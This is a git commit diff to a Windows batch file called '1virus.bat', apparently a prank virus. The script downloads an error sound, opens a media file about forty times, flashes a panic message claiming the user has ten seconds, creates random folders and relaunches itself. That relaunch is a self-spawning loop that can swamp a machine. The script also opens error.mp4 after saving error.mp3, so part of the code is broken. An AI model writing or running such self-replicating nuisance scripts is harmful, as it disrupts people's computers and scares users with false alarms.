3a4e38ca509db9bc52fec52504c98c6e4edde672
Aarav655765 <aaravofficial9954@gmail.com>
2024-05-20 05:02:44 -0700

    Update 1virus.bat

--- 1virus.bat
+++ 1virus.bat
@@ -2,6 +2,47 @@
 :Admin
 powershell -Command "Invoke-WebRequest https://cdn.pixabay.com/download/audio/2022/03/10/audio_e4e7943871.mp3?filename=windows-error-sound-effect-35894.mp3 -Outfile error.mp3"
 start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
+start error.mp4
 start "" /wait cmd /c "echo DO SOMETHING RIGHT NOW YOU ONLY HAVE 10 SECONDS!&echo(&pause"
 mkdir %Random%
 start 1virus.bat
